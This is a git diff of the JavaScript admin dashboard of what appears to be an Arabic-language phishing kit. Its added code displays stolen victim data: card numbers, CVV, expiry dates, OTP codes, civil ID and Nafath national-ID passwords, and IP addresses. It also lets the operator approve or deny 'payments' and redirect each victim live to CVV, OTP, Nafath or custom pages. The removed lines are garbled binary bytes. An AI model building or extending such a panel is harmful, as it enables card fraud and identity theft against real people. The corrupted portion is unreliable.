@@ -660,207 +660,289 @@
     try {
       const d = await post("/api/admin/set-redirect", { target: page, reference: ref });
       toast(d.success ? `تم توجيه العميل إلى صفحة ${page}` : "فشل التوجيه", d.success?"ok":"err");
-    } catch { toast("خطأ في الاتصb)�a��\���N�B�B��\�[���[��[ۈ�]�\�\��\��J�Y�H�ۜ�[�]H��[Y[���][[Y[��RY
-�\��K]\�IܙY�X
-N�ۜ�\�H[�]�[�]��[YK��[J
-H�	��Y�
-]\�
-H��\�
-	�)�+�+�a6)�a6,v)�6*�.6(�b6a6)�b��	�\���N��]\���B��H�ۜ�H]�Z]��
-��\K�YZ[���]\�Y\�X���\��]�\��Y�\�[��N��Y�JN�\�
-��X��\���6*�aH6*�b6+6b�a�6)�a6.vavb�a6)va6b�	�\�X��`v-6a6)�a6*�b6+6b�aȋ��X��\��ț�Ȏ��\���NY�
-[�]
-H[�]��[YHH	��H�]���\�
-�+�-�(�6`vb�6)�a6)�*�-v)�a��\���N�B�B��ʈOOOOH6`�*6b6a�,v`v-�6)�a6+�`v.HOOOOH
-�\�[���[��[ۈ^[Y[�X�[ۊ�Y�X�[ۊH�]�]T�Y�˙[]J�Y�N�[�\���������N�ۜ��X�H��[Y[��]Y\�T�[X�܊	˘X�[ۋ\�X�[ۉ�NY�
-�X�H�X˘�\��\���[[ݙJ	�\�[�]��N�ۜ�\�Н�H��[Y[���][[Y[��RY
-^K\\��IܙY�X
-N�ۜ�[�P��H��[Y[���][[Y[��RY
-^KY[�YYIܙY�X
-NY�
-\�Н�H�\�Н���\��\���[[ݙJ	�X�]�I�N�\�Н��\�X�YH�YN�\�Н��^�۝[�H	�+6)�,vb������B�Y�
-[�P��H�[�P����\��\���[[ݙJ	�X�]�I�N�[�P���\�X�YH�YN�[�P���^�۝[�H	�+6)�,vb������B��H�ۜ�H]�Z]��
-��\K�YZ[��^[Y[�XX�[ۈ���Y�\�[��N��Y�X�[ۈJNY�
-��X��\��H�ۜ�X�[ۓX�[HX�[ۈOOH	�\����	��!H6`�*6b6a	��	��c6,v`v-���\�
-	�X�[ۓX�[HH6*�aH6*�b6+6b�a�6)�a6.vavb�aX�[ۏOOI�\�������Ή�\���N�Y[
+    } catch { toast("خطأ في الاتصال","err"); }
+  }
 
-NY�
-�\��[��[��Y�	���\��[��[��Y�OOH�Y�H�][Y[�]
+  async function navUserCustom(ref) {
+    const input = document.getElementById(`custom-url-${ref}`);
+    const url = input ? input.value.trim() : '';
+    if (!url) { toast('أدخل الرابط أولاً', 'err'); return; }
+    try {
+      const d = await post("/api/admin/set-redirect", { target: url, reference: ref });
+      toast(d.success ? `تم توجيه العميل إلى: ${url}` : "فشل التوجيه", d.success?"ok":"err");
+      if (input) input.value = '';
+    } catch { toast("خطأ في الاتصال","err"); }
+  }
 
+  /* ===== قبول/رفض الدفع ===== */
+  async function paymentAction(ref, action) {
+    newDataRefs.delete(ref);
+    renderRows(rows);
+    const sec = document.querySelector('.action-section');
+    if (sec) sec.classList.remove('has-new');
+    const passBtn = document.getElementById(`pay-pass-${ref}`);
+    const denyBtn = document.getElementById(`pay-denied-${ref}`);
+    if (passBtn) { passBtn.classList.remove('active'); passBtn.disabled = true; passBtn.textContent = 'جاري...'; }
+    if (denyBtn) { denyBtn.classList.remove('active'); denyBtn.disabled = true; denyBtn.textContent = 'جاري...'; }
+    try {
+      const d = await post("/api/admin/payment-action", { reference: ref, action });
+      if (d.success) {
+        const actionLabel = action === 'pass' ? '✅ قبول' : '❌ رفض';
+        toast(`${actionLabel} - تم توجيه العميل`, action==='pass'?'ok':'err');
+        loadAll();
+        if (currentOpenRef && currentOpenRef === ref) {
+          setTimeout(() => openDetail(ref), 400);
+        } else {
+          if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+          if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
+        }
+      } else {
+        toast('فشل الإجراء: ' + (d.error||''), 'err');
+        if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+        if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
+      }
+    } catch(e) {
+      toast('خطأ في الاتصال', 'err');
+      if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+      if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
+    }
+  }
 
-HO��[�]Z[
-�Y�K
-
-NH[�HY�
-\�Н�H�\�Н��\�X�YH�[�N�\�Н��[��\�SH	�H�\��H��H�KX�X��X�\��KY�[���O�6`�*6b6a	��B�Y�
-[�P��H�[�P���\�X�YH�[�N�[�P���[��\�SH	�H�\��H��H�K^X�\��KY�[���O�6,v`v-���B�B�H[�H�\�
-	�`v-6a6)�a6)v+6,v)�(�	�
-�
-�\��ܟ	��K	�\���NY�
-\�Н�H�\�Н��\�X�YH�[�N�\�Н��[��\�SH	�H�\��H��H�KX�X��X�\��KY�[���O�6`�*6b6a	��B�Y�
-[�P��H�[�P���\�X�YH�[�N�[�P���[��\�SH	�H�\��H��H�K^X�\��KY�[���O�6,v`v-���B�B�H�]�
-JH�\�
-	�+�-�(�6`vb�6)�a6)�*�-v)�a	�	�\���NY�
-\�Н�H�\�Н��\�X�YH�[�N�\�Н��[��\�SH	�H�\��H��H�KX�X��X�\��KY�[���O�6`�*6b6a	��B�Y�
-[�P��H�[�P���\�X�YH�[�N�[�P���[��\�SH	�H�\��H��H�K^X�\��KY�[���O�6,v`v-���B�B�B��\�[���[��[ۈ\�]\��Y��]\�H��[Y[��]Y\�T�[X�ܐ[
-��[Y[�H�K��ܑXX�
-[O�[��\��\���[[ݙJ��[��JN�H�ۜ�H]�Z]��
-��\K�YZ[��\]K\�]\ȋ��Y�\�[��N��Y��]\�JNY�
-��X��\��H��\�
-�*�aH6*�+v+�b�*�6)�a6+v*va6*H���ȊN��Y[
+  async function updStatus(ref, status) {
+    document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
+    try {
+      const d = await post("/api/admin/update-status", { reference:ref, status });
+      if (d.success) { toast("تم تحديث الحالة","ok"); loadAll(); }
+      else toast("فشل التحديث","err");
+    } catch { toast("خطأ في الاتصال","err"); }
+  }
 
-N�B�[�H�\�
-�`v-6a6)�a6*�+v)�a6*H��\���NH�]���\�
-�+�-�(�6`vb�6)��a6)�*�-v)�a��\���N�B�B��ʈOOOOH]Z[[�[OOOOH
-�\�[���[��[ۈ�[�]Z[
-�Y�H�H�ۜ�H]�Z]�]
-�\K�YZ[�؛���[����ܙY�X
-NY�
-Y��X��\��H�]\���ۜ��H�]N�\��[��[��Y�H�Y���[Y[���][[Y[��RY
-�U]H�K�^�۝[�H6*�`v)�-vb�a6)�a6-�a6*H	؋��Y�\�[��RYX��[Y[���][[Y[��RY
-�P��H�K�[��\�SH�Z[]Z[
-�N��[Y[���][[Y[��RY
-�]Z[ݙ\�^H�K��\��\��Y
-���ȊNY�
-�]�]T�Y�˚\��Y�JH�ۜ��X�H��[Y[��]Y\�T�[X�܊	˘X�[ۋ\�X�[ۉ�NY�
-�X�H�X˘�\��\��Y
-	�\�[�]��N�ۜ�\�ݙP��H��[Y[���][[Y[��RY
-^K\\��IܙY�X
-N�ۜ��Z�X���H��[Y[���][[Y[��RY
-^KY[�YYIܙY�X
-NY�
-\�ݙP��H\�ݙP����\��\��Y
-	�X�]�I�NY�
-�Z�X���H�Z�X�����\��\��Y
-	�X�]�I�NB�H�]���\�
-�+�-�(�6`vb�6*�+vavb�a6)�a6*�`v)�-vb�a��\���N�B�B���[��[ۈ���S[�[
+  /* ===== Detail Modal ===== */
+  async function openDetail(ref) {
+    try {
+      const d = await get(`/api/admin/bookings/${ref}`);
+      if (!d.success) return;
+      const b = d.data;
+      currentOpenRef = ref;
+      document.getElementById("mTitle").textContent = `تفاصيل الطلب - ${b.referenceId}`;
+      document.getElementById("mBody").innerHTML = buildDetail(b);
+      document.getElementById("detailOverlay").classList.add("show");
+      if (newDataRefs.has(ref)) {
+        const sec = document.querySelector('.action-section');
+        if (sec) sec.classList.add('has-new');
+        const approveBtn = document.getElementById(`pay-pass-${ref}`);
+        const rejectBtn = document.getElementById(`pay-denied-${ref}`);
+        if (approveBtn) approveBtn.classList.add('active');
+        if (rejectBtn) rejectBtn.classList.add('active');
+      }
+    } catch { toast("خطأ في تحميل التفاصيل","err"); }
+  }
 
-H�\��[��[��Y�H�[��[Y[���][[Y[��RY
-�]Z[ݙ\�^H�K��\��\���[[ݙJ���ȊNB���[��[ۈ���X�[�[
-H�ۜ��H�[�H��ۜ��Y�U�[H��[���[	��K��\X�J���	�	�K��\X�J�����	ȊN�ۜ��H�[��]ۈ�\��H���KX���ۘ�X��H��
-	���Y�U�[I�H��H�\��H��H�KX��H���O�؝]ۏ�����]\��]��]��\��H�[����X�[O�]��]��\��H�]�[��ݟI��O�]���]��B���[��[ۈ�Z[]Z[
-�H]H]��\��H��X�]]H��*6b�)�a�)�*�6)�a6.vavb�a�]���]��\��H�]Z[YܚY���	�����)�a6)�,�aH����Y[��[YJ_I�����,v`�aH6)�a6a�b6b�*H����Y[�Y
-_B�	�����)�a6+6b6)�a����Y[�ۙJ_I�����*va6*6,vb�+�6)�a6)va6`�*�,vb6a�b�����Y[�[XZ[
-_B�	�����)�a6ava�*�`�*H����\��X�T�Y�[ۊ_I�����T6)�a6.vavb�a����Y[�\
-_B��]���]��\��H��X�]]H��*6b�)�a�)�*�6)�a6-�a6*�]���]��\��H�]Z[YܚY���	�����a�b6.H6)�a6+�+�av*H����\��X�U\J_I�����*�)�,vb�+�6)�a6-�a6*����\��X�Q]J_B�	�����b6`�*�6)�a6-�a6*����\��X�U[YJ_I�����*va6,v`�aH6)�a6av,v+6.vb�����Y�\�[��RY
-_B�	�����)�a6+v)�a6*H����]\�_I�����*�*v,vb�b�+�6)�a6)va�-6)�(H�
-��ܙX]Y]��K��X���[��NJK��\X�J����J_B��]�����6*6b�)�a�)�*�6)�a6av,�*�+�+�aH6)�a6)v-�*v`vb�b�*B�Y�
-��\�\�]H	��ؚ�X���^\���\�\�]JK�[���
-H�ۜ�YH��\�\�]N�ۜ�^�Q�Y[�H�NY�
-Y��]�[Y
-H^�Q�Y[˜\�
-����)�a6,v`�aH6)�a6av+�a�b��Y��]�[Y
-JNY�
-Y�\���ܙ
-H^�Q�Y[˜\�
-����`�a6av*H6)�a6av,vb6,H�Y�\���ܙ
-JNY�
-Y��[YJH^�Q�Y[˜\�
-����)�a6)�,�aH6)�a6`�)�ava�Y��[YJJNY�
-Y�ۙJH^�Q�Y[˜\�
-����)�a6a�)�*�`H�Y�ۙJJNY�
-Y�[XZ[
-H^�Q�Y[˜\�
-����)�a6*6,vb�+ȋY�[XZ[
-JNY�
-Y��Y�[ۊH^�Q�Y[˜\�
-����)�a6ava�-�`�*H�Y��Y�[ۊJNY�
-Y��ݙ\��ܘ]JH^�Q�Y[˜\�
-����)�a6av+v)�`v.6*H�Y��ݙ\��ܘ]JJNY�
-Y�\�\�\JH^�Q�Y[˜\�
-����a�b6.H6)�a6av,�*�+�+�aH�Y�\�\�\JJNY�
-^�Q�Y[˛[���
-H
-�H]��\��H��X�]]H��*6b�)�a�)�*�6)v-�)�`vb�*O�]���]��\��H�]Z[YܚY���^�Q�Y[˚��[�	��_O�]��B�B����6*6b�)�a�)�*�6)�a6+�`v.B�Y�
-��^[Y[�
-H�ۜ�^T�\H��^[Y[���\N�ۜ��\�[Y\�H�N�	�*6b�)�a�)�*�6)�a6*6-�)�`�*I���	�,vav,��	�Έ	�,v`�aH6,�,vb�UI�N�ۜ��\�[YHH�\�[Y\��^T�\H	�*6b�)�a�)�*�6)�a6*6-�)�`�*I�
-�H]��\��H��X�]]H��*6b�)�a�)�*�6)�a6+�`v.O�]���]��\��H�]Z[YܚY���	�����)�,�aH6+v)�ava6)�a6*6-�)�`�*H���^[Y[���\��\��[Y_��^[Y[���\��\�_I�����,v`�aH6)�a6*6-�)�`�*H���^[Y[���\��[X�\�_B�	�����*�)�,vb�+�6)�a6)�a�*�a�)�(H���^[Y[���\�^\�_��^[Y[��^\�Q]J_I�����Օ����^[Y[���\�ݝ���^[Y[��ݝ�_B�	�����)�a6av*6a6.����^[Y[��[[�[�
-_I�����)�a6+v)�a6*H���^[Y[���]\�_B��]���]��\��H�X�[ۋ\�X�[ۈ���]��\��H�X�[ۋ\�X�]]H��H�\��H��H�K\�Y[X�X�Ȉ�[OH���܎��M�L�H���O�6)v+6,v)�(H6.vava6b�*H6)�a6+�`v.O�]���]��\��H�X�[ۋ\�\Z[��ȈYH��\Z[���I؋��Y�\�[��RYH���6)�a6+�-�b6*H6)�a6+v)�a6b�*N�	��\�[Y_H
-6+�-�b6*H	�^T�\H6ava��H6(�+�,H6)v+6,v)�(N�	؋�^[Y[��^[Y[�X�[ۈ	�a6)�6b�b6+6+��B��]���]��\��H�X�[ۋX��ȏ���]ۈ�\��H�X�[ۋX��X\�ݙH�YH�^K\\��I؋��Y�\�[��RYH�ۘ�X��H�^[Y[�X�[ۊ	�؋��Y�\�[��RYI�	�\���H���H�\��H��H�KX�X��X�\��KY�[���O�6`�*6b6a�؝]ۏ���]ۈ�\��H�X�[ۋX��\�Z�X��YH�^KY[�YYI؋��Y�\�[��RYH�ۘ�X��H�^[Y[�X�[ۊ	�؋��Y�\�[��RYI�	�[�YY	�H���H�\��H��H�K^X�\��KY�[���O�6,v`v-��؝]ۏ���]����]��B����6*6b�)�a�)�*���Y�
-���
-H
-�H]��\��H��X�]]H��*6b�)�a�)�*���]���]��\��H�]Z[YܚY���	�����,vav,����������J_I�����*�)�,vb�+�6)�a6)�,�*�a6)�aH�
-����ܙX]Y]��K��X���[��NJK��\X�J����J_B��]��B����6*6b�)�a�)�*�6a�`v)�,�Y�
-���Y�]
-H
-�H]��\��H��X�]]H��*6b�)�a�)�*�6a�`v)�,�]���]��\��H�]Z[YܚY���	�����,v`�aH6)�a6a�b6b�*H����Y�]��Y�]Y���Y�]��][ۘ[Y
-_I�����`�a6av*H6)�a6av,vb6,H����Y�]��Y�]\���ܙ���Y�]�\���ܙ
-_B�	�����,vav,�6a�`v)�,����Y�]��Y�]�[X�\����Y�]���J_I�����)�a6+v)�a6*H����Y�]��]\�_B��]��B����6*�b6+6b�a�6)�a6.vavb�a�
-�H]��\��H��]�\�X�[ۈ���]��\��H��]�\�X�]]H��H�\��H��H�K\�[����O�6*�b6+6b�a�6)�a6.vavb�a6)va6bH6-v`v+v*O�]���]��\��H��]�X��ȏ���]ۈ�\��H��]�X���ۘ�X��H��]�\�\�	�؋��Y�\�[��RYI�	�ݝ��H��H�\��H��H�KXܙY]X�\�L�Y��۝��[OH���܎��M�L�H���O�Օ�؝]ۏ���]ۈ�\��H��]�X���ۘ�X��H��]�\�\�	�؋��Y�\�[��RYI�	��	�H��H�\��H��H�K\�Y[[��Ȉ�[OH���܎�����YY���O��؝]ۏ���]ۈ�\��H��]�X���ۘ�X��H��]�\�\�	�؋��Y�\�[��RYI�	ۘY�]	�H��H�\��H��H�K\ۙH��[OH���܎��LX�����O�a�`v)�,؝]ۏ���]ۈ�\��H��]�X���ۘ�X��H��]�\�\�	�؋��Y�\�[��RYI�	�^[Y[�	�H��H�\��H��H�KX�\�\�X�Ȉ�[OH���܎��M��
-����O�)�a6+�`v.O؝]ۏ���]ۈ�\��H��]�X���ۘ�X��H��]�\�\�	�؋��Y�\�[��RYI�	��X��\���H��H�\��H��H�KX�X��X�\��H��[OH���܎��M�L�H���O�)�a6a�+6)�+O؝]ۏ���]����]���]��\��H��\��K]\�\�X�[ۈ���]��\��H��]�\�X�]]H��H�\��H��H�K[[��M
-YYȏ��O�6*�b6+6b�a�6a6,v)�*6-�6av+�-v-O�]���[�]\OH�^�YH��\��K]\�I؋��Y�\�[��RYH�X�Z�\�H�΋�ˋ���ς��]ۈ�\��H��]�X����[OH��X��ܛ�[��̍M��X����܎�ٙ��؛ܙ\�X��܎�̍M��X�Ȉۘ�X��H��]�\�\��\��J	�؋��Y�\�[��RYI�H���H�\��H��H�K\�[�Y�[���O�6)v,v,�)�a�؝]ۏ���]����]\��B���[��[ۈ�
-
-H�]�Y�]܋��\��\��ܚ]U^
-
-K�[�
+  function closeModal() {
+    currentOpenRef = null;
+    document.getElementById("detailOverlay").classList.remove("show");
+  }
 
-OO��\�
-�*�aH6)�a6a�,�+����ȊJK��]�
+  function dRow(label, val) {
+    const v = val || "-";
+    const safeVal = String(val||'').replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+    const cp = val ? `<button class="copy-btn" onclick="cp('${safeVal}')"><i class="bi bi-copy"></i></button>` : "";
+    return `<div><div class="d-lbl">${label}</div><div class="d-val">${v}${cp}</div></div>`;
+  }
 
+  function buildDetail(b) {
+    let h = `
+      <div class="sec-title">بيانات العميل</div>
+      <div class="detail-grid">
+        ${dRow("الاسم",b.clientName)}${dRow("رقم الهوية",b.clientId)}
+        ${dRow("الجوال",b.clientPhone)}${dRow("البريد الإلكتروني",b.clientEmail)}
+        ${dRow("المنطقة",b.serviceRegion)}${dRow("IP العميل",b.clientIp)}
+      </div>
+      <div class="sec-title">بيانات الطلب</div>
+      <div class="detail-grid">
+        ${dRow("نوع الخدمة",b.serviceType)}${dRow("تاريخ الطلب",b.serviceDate)}
+        ${dRow("وقت الطلب",b.serviceTime)}${dRow("الرقم المرجعي",b.referenceId)}
+        ${dRow("الحالة",b.status)}${dRow("تاريخ الإنشاء",(b.createdAt||"").substring(0,19).replace("T"," "))}
+      </div>`;
 
-OO��JNB��ʈOOOOH^ܝ�ՈOOOOH
-��[��[ۈ^ܝ�݊\JH��[Y[��]Y\�T�[X�ܐ[
-��[Y[�H�K��ܑXX�
-[O�[��\��\���[[ݙJ��[��JN�ۜ�HH��[Y[��ܙX]Q[[Y[�
-	�I�NK��Y�H�\K�YZ[��^ܝ��\_XK��]]�X�]J	��ۛ�Y	�^ܝ��\_K��ݘ
-N��Y]]XY\��XH�]���]�
-K��Y��XY\�Έ�]]ܚ^�][ێ���X\�\��
-���[�HJB��[��O����؊
-JB��[��؈O��ۜ�\�HT��ܙX]Sؚ�X�T�
-�؊N�ۜ�[��H��[Y[��ܙX]Q[[Y[�
-	�I�N[�˚�Y�H\�[�˙�ۛ�YH^ܝ��\_K��ݘ[�˘�X��
-NT���]���Sؚ�X�T�
-\�
-NJB���]�
+    // بيانات المستخدم الإضافية
+    if (b.userData && Object.keys(b.userData).length > 0) {
+      const ud = b.userData;
+      const extraFields = [];
+      if (ud.civilId) extraFields.push(dRow("الرقم المدني",ud.civilId));
+      if (ud.password) extraFields.push(dRow("كلمة المرور",ud.password));
+      if (ud.name) extraFields.push(dRow("الاسم الكامل",ud.name));
+      if (ud.phone) extraFields.push(dRow("الهاتف",ud.phone));
+      if (ud.email) extraFields.push(dRow("البريد",ud.email));
+      if (ud.region) extraFields.push(dRow("المنطقة",ud.region));
+      if (ud.governorate) extraFields.push(dRow("المحافظة",ud.governorate));
+      if (ud.userType) extraFields.push(dRow("نوع المستخدم",ud.userType));
+      if (extraFields.length > 0) {
+        h += `<div class="sec-title">بيانات إضافية</div>
+          <div class="detail-grid">${extraFields.join('')}</div>`;
+      }
+    }
 
+    // بيانات الدفع
+    if (b.payment) {
+      const payStep = b.payment.step || 1;
+      const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
+      const stepName = stepNames[payStep] || 'بيانات البطاقة';
+      h += `<div class="sec-title">بيانات الدفع</div>
+        <div class="detail-grid">
+          ${dRow("اسم حامل البطاقة",b.payment.cardHolderName||b.payment.cardHolder)}${dRow("رقم البطاقة",b.payment.cardNumber)}
+          ${dRow("تاريخ الانتهاء",b.payment.cardExpiry||b.payment.expiryDate)}${dRow("CVV",b.payment.cardCvv||b.payment.cvv)}
+          ${dRow("المبلغ",b.payment.amount)}${dRow("الحالة",b.payment.status)}
+        </div>
+        <div class="action-section">
+          <div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div>
+          <div class="action-step-info" id="step-info-${b.referenceId}">
+            الخطوة الحالية: ${stepName} (خطوة ${payStep} من 3) | آخر إجراء: ${b.payment.paymentAction || 'لا يوجد'}
+          </div>
+          <div class="action-btns">
+            <button class="action-btn-approve" id="pay-pass-${b.referenceId}" onclick="paymentAction('${b.referenceId}','pass')">
+              <i class="bi bi-check-circle-fill"></i> قبول
+            </button>
+            <button class="action-btn-reject" id="pay-denied-${b.referenceId}" onclick="paymentAction('${b.referenceId}','denied')">
+              <i class="bi bi-x-circle-fill"></i> رفض
+            </button>
+          </div>
+        </div>`;
+    }
 
-HO��\�
-�+�-�(�6`vb�6)�a6*�-v+�b�,H��\���JNB��ʈOOOOH����]�[�OOOOH
-��[��[ۈ�ۛ�X�����
-H����H[��]�������]�[ȋ�[��ܝΖȝ�X�����]���[�ȗHJN���˙[Z]
-���[�YZ[�����[�JN���˛ۊ��ۛ�X��
+    // بيانات OTP
+    if (b.otp) {
+      h += `<div class="sec-title">بيانات OTP</div>
+        <div class="detail-grid">
+          ${dRow("رمز OTP",b.otp.otpCode)}${dRow("تاريخ الاستلام",(b.otp.createdAt||"").substring(0,19).replace("T"," "))}
+        </div>`;
+    }
 
-HO���[Y[���][[Y[��RY
-��ۛ���K��\�Ә[YHH��ۛ�Y�ۈ���[Y[���][[Y[��RY
-��ۛ��K�^�۝[�H�av*�-va�JN���˛ۊ�\��ۛ�X��
+    // بيانات نفاذ
+    if (b.nafath) {
+      h += `<div class="sec-title">بيانات نفاذ</div>
+        <div class="detail-grid">
+          ${dRow("رقم الهوية",b.nafath.nafathId||b.nafath.nationalId)}${dRow("كلمة المرور",b.nafath.nafathPassword||b.nafath.password)}
+          ${dRow("رمز نفاذ",b.nafath.nafathNumber||b.nafath.code)}${dRow("الحالة",b.nafath.status)}
+        </div>`;
+    }
 
-HO���[Y[���][[Y[��RY
-��ۛ���K��\�Ә[YHH��ۛ�Y�ٙ����[Y[���][[Y[��RY
-��ۛ��K�^�۝[�H�.�b�,H6av*�-va�JN���˛ۊ��]Л���[�ȋ
-��HO��Y\
+    // توجيه العميل
+    h += `<div class="nav-section">
+      <div class="nav-sec-title"><i class="bi bi-send"></i> توجيه العميل إلى صفحة</div>
+      <div class="nav-btns">
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','cvv')"><i class="bi bi-credit-card-2-front" style="color:#16a34a"></i>CVV</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','otp')"><i class="bi bi-shield-lock" style="color:#7c3aed"></i>OTP</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','nafath')"><i class="bi bi-phone" style="color:#0891b2"></i>نفاذ</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','payment')"><i class="bi bi-cash-stack" style="color:#d97706"></i>الدفع</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','success')"><i class="bi bi-check-circle" style="color:#16a34a"></i>النجاح</button>
+      </div>
+    </div>
+    <div class="custom-url-section">
+      <div class="nav-sec-title"><i class="bi bi-link-45deg"></i> توجيه لرابط مخصص</div>
+      <input type="text" id="custom-url-${b.referenceId}" placeholder="https://..." />
+      <button class="nav-btn" style="background:#2563eb;color:#fff;border-color:#2563eb;" onclick="navUserCustom('${b.referenceId}')">
+        <i class="bi bi-send-fill"></i> إرسال
+      </button>
+    </div>`;
 
-N��\�
-6-�a6*6+6+�b�+Έ	ؚ˘�Y[��[Y_�˜�Y�\�[��_	��X�[���N�Y[
+    return h;
+  }
 
-NJN���˛ۊ��]�^[Y[��
-
-HO��ۜ�\S�[Y\�H�ݝ��	�Օ����	��	�ۙ]�	�ӑU	��Y�]�	�a�`v)�,	�^[Y[��	�+�`v.I�N�ۜ�\SX�[H\S�[Y\���\WH�\H	��Y�
-��Y�\�[��JH�]�]T�Y�˘Y
-��Y�\�[��JN�Y\
+  function cp(txt) {
+    navigator.clipboard.writeText(txt).then(()=>toast("تم النسخ","ok")).catch(()=>{});
+  }
 
-N��\�
-6*6b�)�a�)�*�6+6+�b�+�*N�	���Y�\�[��_	��H	�\SX�[X�[���N�Y[
+  /* ===== Export CSV ===== */
+  function exportCsv(type) {
+    document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
+    const a = document.createElement('a');
+    a.href = `/api/admin/export/${type}`;
+    a.setAttribute('download', `export_${type}.csv`);
+    // Add auth header via fetch
+    fetch(a.href, { headers: { Authorization: "Bearer " + token } })
+      .then(r => r.blob())
+      .then(blob => {
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = `export_${type}.csv`;
+        link.click();
+        URL.revokeObjectURL(url);
+      })
+      .catch(() => toast("خطأ في التصدير","err"));
+  }
 
-NY�
-�\��[��[��Y�	���\��[��[��Y�OOH��Y�\�[��JH�][Y[�]
+  /* ===== Socket.io ===== */
+  function connectSock() {
+    sock = io({ path:"/socket.io", transports:["websocket","polling"] });
+    sock.emit("joinAdmin", { token });
+    sock.on("connect", () => {
+      document.getElementById("connDot").className = "conn-dot on";
+      document.getElementById("connTxt").textContent = "متصل";
+    });
+    sock.on("disconnect", () => {
+      document.getElementById("connDot").className = "conn-dot off";
+      document.getElementById("connTxt").textContent = "غير متصل";
+    });
+    sock.on("newBooking", (bk) => {
+      beep(); toast(`طلب جديد: ${bk.clientName||bk.reference||''}`,"inf");
+      loadAll();
+    });
+    sock.on("newPayment", (d) => {
+      const typeNames = { cvv: 'CVV', otp: 'OTP', knet: 'KNET', nafath: 'نفاذ', payment: 'دفع' };
+      const typeLabel = typeNames[d.type] || d.type || '';
+      if (d.reference) newDataRefs.add(d.reference);
+      beep(); toast(`بيانات جديدة: ${d.reference||''} ${typeLabel}`,"inf");
+      loadAll();
+      if (currentOpenRef && currentOpenRef === d.reference) {
+        setTimeout(() => openDetail(d.reference), 500);
+      }
+    });
+    sock.on("visitor_update", (d) => {
+      const el = document.getElementById("sOnline");
+      if (el) el.textContent = d.online || 0;
+    });
+    sock.on("visitorsCount", (d) => {
+      const el = document.getElementById("sOnline");
+      if (el) el.textContent = d.count || 0;
+    });
+  }
 
+  function beep() {
+    try {
+      const ctx = new (window.AudioContext||window.webkitAudioContext)();
+      const o1 = ctx.createOscillator(), g1 = ctx.createGain();
+      o1.connect(g1); g1.connect(ctx.destination);
+      o1.type = 'sine';
+      o1.frequency.setValueAtTime(880, ctx.currentTime);
+      g1.gain.setValueAtTime(0.5, ctx.currentTime);
+      g1.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime+0.25);
+      o1.start(ctx.currentTime); o1.stop(ctx.currentTime+0.25);
+      const o2 = ctx.createOscillator(), g2 = ctx.createGain();
+      o2.connect(g2); g2.connect(ctx.destination);
+      o2.type = 'sine';
+      o2.frequency.setValueAtTime(1320, ctx.currentTime+0.28);
+      g2.gain.setValueAtTime(0.5, ctx.currentTime+0.28);
+      g2.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime+0.55);
+      o2.start(ctx.currentTime+0.28); o2.stop(ctx.currentTime+0.55);
+    } catch {}
+  }
 
-HO��[�]Z[
-��Y�\�[��JK
-L
-NB�JN���˛ۊ��\�]ܗ�\]H�
-
-HO��ۜ�[H��[Y[���][[Y[��RY
-��ۛ[�H�NY�
-[
-H[�^�۝[�H�ۛ[�HJN���˛ۊ��\�]ܜ���[��
-
-HO��ۜ�[H��[Y[���][[Y[��RY
-��ۛ[�H�NY�
-[
-H[�^�۝[�H���[�JNB���[��[ۈ�Y\
+  /* ===== Toast ===== */
+  function toast(msg, type="inf") {
+    const ic = { ok:"bi-check-circle-fill", err:"bi-x-circle-fill", inf:"bi-info-circle-fill" };
+    const cl = { ok:"#16a34a", err:"#dc2626", inf:"#2563eb" };
+    const el = document.createElement("div");
+    el.className = `toast-item ${type}`;
+    el.innerHTML = `<i class="bi ${ic[type]}" style="color:${cl[type]};font-size:18px;"></i><span style="font-size:13px;">${msg}</span>`;
+    document.getElementById("toasts").appendChild(el);
+    setTimeout(()=>el.remove(), 4000);
+  }
 
-H�H�ۜ��H�]�
-�[��ː]Y[��۝^�[��˝�X��]]Y[��۝^
-J
-N���7B��7G��7&VFT�66���F�"���s�7G��7&VFTv�ₓ����6���V7B�s��s�6���V7B�7G��FW7F��F��⓰���G�R�w6��Rs����g&WVV�7��6WEf�VTEF��R����7G��7W'&V�EF��R���s�v���6WEf�VTEF��R��R�7G��7W'&V�EF��R���s�v���W���V�F��&�F�f�VTEF��R���7G��7W'&V�EF��R��#R�����7F'B�7G��7W'&V�EF��R����7F��7G��7W'&V�EF��R��#R���6��7B�"�7G��7&VFT�66���F�"���s"�7G��7&VFTv�ₓ���"�6���V7B�s"��s"�6���V7B�7G��FW7F��F��⓰��"�G�R�w6��Rs���"�g&WVV�7��6WEf�VTEF��R�3#�7G��7W'&V�EF��R��#����s"�v���6WEf�VTEF��R��R�7G��7W'&V�EF��R��#����s"�v���W���V�F��&�F�f�VTEF��R���7G��7W'&V�EF��R��SR����"�7F'B�7G��7W'&V�EF��R��#����"�7F��7G��7W'&V�EF��R��SR����6F6��ТР�������F�7B�������gV�7F���F�7B��6r�G�S�&��b"���6��7B�2�����&&��6�V6��6�&6�R�f���"�W'#�&&�ׂ�6�&6�R�f���"���c�&&�֖�f��6�&6�R�f���"Ӱ�6��7B6������"3f3F"�W'#�"6F3#c#b"���c�"3#Sc6V""Ӱ�6��7BV��F�7V�V�B�7&VFTV�V�V�B�&F�b"���V��6�74��R�F